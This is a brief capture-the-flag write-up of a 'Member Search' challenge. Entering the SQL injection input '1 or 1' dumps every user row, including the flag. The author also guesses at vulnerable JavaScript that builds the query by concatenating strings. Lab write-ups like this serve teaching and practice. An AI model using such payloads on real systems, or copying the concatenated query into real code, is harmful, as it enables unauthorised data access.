# Member Search

Looks like some sort of SQL injection

Entering `1 or 1` in the search field shows (I assume) all users in database:

```
ID: 1 or 1 
First name: Barack Hussein
Surname : Obama

ID: 1 or 1 
First name: Adolf
Surname : Hitler

ID: 1 or 1 
First name: Joseph
Surname : Staline

ID: 1 or 1 
First name: Flag
Surname : GetThe
```
 
Maybe the code looks something like this

```js
query("SELECT firstname, lastname FROM users WHERE id = " + input)
```
